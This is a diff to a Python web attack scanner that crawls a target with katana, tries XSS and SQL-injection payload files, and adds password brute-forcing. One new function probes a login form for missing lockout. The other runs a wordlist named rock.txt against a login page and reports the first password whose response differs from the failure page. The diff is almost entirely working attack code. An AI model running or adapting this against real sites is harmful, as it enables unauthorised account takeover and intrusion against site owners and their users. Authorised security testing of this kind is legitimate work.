@@ -8,6 +8,7 @@ import concurrent.futures
 URL_SUBDOMAINS = f'/usr/src/app/tasks/files/subdomains.txt'
 URL_XSS_PAYLOADS = f'/usr/src/app/tasks/files/xss_payload.txt'
 URL_SQLI_PAYLOADS = f'/usr/src/app/tasks/files/sqli_payload.txt'
+URL_PASSWORDS = f'/usr/src/app/tasks/files/rock.txt'
 
 def generic_attack(subdomain: str, payloads: list):
     for payload in payloads:
@@ -21,7 +22,24 @@ def generic_task(subdomain, payloads):
         vulnerable, reflection = generic_attack(subdomain, payloads)
         if vulnerable:
             return subdomain,reflection
-        
+
+def execute(method, payloads, subdomains):
+    scanner_result = []
+    num_threads = 5
+
+    with concurrent.futures.ThreadPoolExecutor(max_workers=num_threads) as executor:
+        futures = {executor.submit(method, subdomain, payloads): subdomain for subdomain in subdomains}
+
+        for future in concurrent.futures.as_completed(futures):
+            subdomain = futures[future]
+            try:
+                task = future.result()
+                if task:
+                    scanner_result.append(task)
+            except Exception as e:
+                print(f"An error occurred while processing {subdomain}: {e}")
+    return scanner_result
+
 def scanner(url_objetive,type):
     output_file = URL_SUBDOMAINS
     result = subprocess.run(['katana', '-u', url_objetive, '-o', output_file], capture_output=True, text=True)
@@ -41,19 +59,35 @@ def scanner(url_objetive,type):
         print(f"Error executing `katana`: {result.stderr}")
     return results
 
-def execute(method, payloads, subdomains):
-    scanner_result = []
-    num_threads = 5
+def bruteforce_type1(url,username_type,password_type):
+    cont = 0
+    data = {username_type:'admin',password_type:'password'}
+    for i in range(0,10):
+        try:
+            requests.post(url, data=data)
+            cont = i
+        except requests.exceptions.HTTPError as err:
+            print(f'HTTP error occurred: {err}')
+            
+    return cont > 5
 
-    with concurrent.futures.ThreadPoolExecutor(max_workers=num_threads) as executor:
-        futures = {executor.submit(method, subdomain, payloads): subdomain for subdomain in subdomains}
+def bruteforce_type2(url,username,username_type,password_type,cookie_value):
+	result = ''
+	passwords = [line.rstrip() for line in open(URL_PASSWORDS,'r')]
+	base_page = requests.get(url).content
+	for password in passwords:
+		try:
+			data = {username_type:username,password_type:password}
+			if cookie_value != '':
+				response = requests.get(url, params=data, cookies = {'Cookie': cookie_value})
+			else:
+				response = requests.post(url, data=data)
+			if base_page == response.content:
+				pass
+			else:
+				result = password
+				break
+		except requests.exceptions.HTTPError as err:
+			print(f'HTTP error occurred: {err}')
 
-        for future in concurrent.futures.as_completed(futures):
-            subdomain = futures[future]
-            try:
-                task = future.result()
-                if task:
-                    scanner_result.append(task)
-            except Exception as e:
-                print(f"An error occurred while processing {subdomain}: {e}")
-    return scanner_result
+	return result
